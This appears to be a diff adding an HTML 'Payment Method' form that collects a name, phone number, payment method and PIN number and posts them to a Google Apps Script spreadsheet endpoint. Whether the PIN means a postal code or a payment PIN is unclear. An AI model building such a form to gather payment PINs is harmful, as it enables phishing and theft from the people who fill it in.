@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>Payment Method Sheets</title>
+    <link rel="stylesheet" href="Style.css">
+</head>
+
+<body>
+    <div class="container">
+        <h2>Payment Method</h2>
+        <div class="form-container">
+            <form name="submit-to-google-sheet">
+                <div class="input-name">
+                    <label for="Name"><i class="fa fa-user lock"></i></label>
+                    <input type="text" name="Name" placeholder="Name" required class="name" id="Name">
+                </div>
+
+                <div class="input-name">
+                    <label for="Number"><i class="fa fa-phone lock"></i></label>
+                    <input type="number" name="Number" placeholder="Number" required class="name" id="Number">
+                </div>
+                <div class="input-name">
+                    <label for="Method"><i class="fa fa-money lock"></i></label>
+                    <input type="text" name="Method" placeholder="Method" required class="name" id="Method">
+                </div>
+                <div class="input-name">
+                    <label for="Pin Code"><i class="fa fa-thumb-tack lock"></i></label>
+                    <input type="number" name="Pin" placeholder="Pin Number" required class="name" id="Pin Code">
+                </div>
+
+                <div class="input-name">
+                    <input type="submit" class="button" value="Send">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyz0rITVnl8150erC76bHuAZFloGPlEzikRKdAlB2JldD7My1gfbxxCx5Z2DvY67CYQ/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+</body>
+
+</html>
